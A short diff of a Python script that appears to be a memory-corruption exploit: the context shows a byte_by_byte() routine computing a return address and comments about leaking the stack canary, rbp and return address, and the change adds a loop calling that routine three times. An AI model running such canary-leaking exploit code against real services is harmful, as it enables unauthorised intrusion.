@@ -47,6 +47,8 @@ def byte_by_byte():
 		ret_address = int(result[0:14] + "15", 16)
 		#log("ret_address: 0x" + result, 'red')
 
+for i in range(3):
+	byte_by_byte()
 
 #leak canary, rbp, ret_address
 #for x in range(3):
